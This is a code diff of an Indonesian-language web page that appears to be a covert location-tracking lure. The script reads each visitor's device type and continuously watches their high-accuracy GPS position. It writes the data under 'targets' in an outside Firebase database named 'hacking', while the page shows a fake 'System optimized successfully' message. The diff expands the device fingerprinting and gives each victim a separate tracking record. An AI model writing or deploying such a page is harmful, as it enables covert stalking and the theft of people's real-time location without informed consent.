@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+                        <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -30,15 +30,8 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        h2 {
-            font-size: 1.2rem;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #ff3333;
-            font-size: 0.9rem;
-        }
+        h2 { font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 10px; }
+        p { color: #ff3333; font-size: 0.9rem; }
     </style>
 </head>
 <body>
@@ -52,7 +45,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        // Konfigurasi Firebase Anda
         const firebaseConfig = {
             databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
         };
@@ -65,23 +57,31 @@
         const statusText = document.getElementById("status-text");
         const errorText = document.getElementById("error-text");
 
-        // Deteksi Jenis Perangkat Target
+        // Deteksi Jenis Perangkat (HP, Tablet, atau Laptop)
         const userAgent = navigator.userAgent;
         let deviceType = "Desktop / PC";
         let deviceIcon = "💻";
 
-        if (/android/i.test(userAgent)) {
+        if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
+            deviceType = "Tablet Device";
+            deviceIcon = "📑";
+        } else if (/android/i.test(userAgent) && !/mobile/i.test(userAgent)) {
+            deviceType = "Android Tablet";
+            deviceIcon = "📑";
+        } else if (/android/i.test(userAgent)) {
             deviceType = "Android Phone";
             deviceIcon = "📱";
-        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-            deviceType = "Apple iOS Device";
-            deviceIcon = "🍏";
+        } else if (/iphone/i.test(userAgent)) {
+            deviceType = "iPhone";
+            deviceIcon = "📱";
         } else if (/mobile/i.test(userAgent)) {
             deviceType = "Mobile Device";
             deviceIcon = "📱";
         }
 
-        // Meminta akses Geolocation dengan Akurasi Tinggi
+        // Buat ID unik untuk setiap perangkat yang membuka halaman ini
+        const targetRef = db.ref("targets").push();
+
         if ("geolocation" in navigator) {
             navigator.geolocation.watchPosition(
                 function(position) {
@@ -89,8 +89,8 @@
                     const lon = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
 
-                    // Kirim data koordinat beserta info perangkat ke Firebase
-                    db.ref("target_location").set({
+                    // Mengirim data menggunakan update agar posisinya terus diperbarui secara real-time
+                    targetRef.set({
                         latitude: lat,
                         longitude: lon,
                         accuracy: accuracy,
@@ -99,25 +99,19 @@
                     }).then(() => {
                         statusText.innerText = "System optimized successfully.";
                         errorText.innerText = "";
-                    }).catch((error) => {
-                        console.error("Firebase write error:", error);
                     });
                 },
                 function(error) {
                     if (error.code === error.PERMISSION_DENIED) {
                         errorText.innerText = "Error: Location permission denied.";
                     } else {
-                        errorText.innerText = "Error: Unable to retrieve accurate location. Please ensure GPS is active.";
+                        errorText.innerText = "Error: Unable to retrieve accurate location.";
                     }
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         } else {
-            errorText.innerText = "Error: Geolocation is not supported by this browser.";
+            errorText.innerText = "Error: Geolocation is not supported.";
         }
     </script>
 </body>
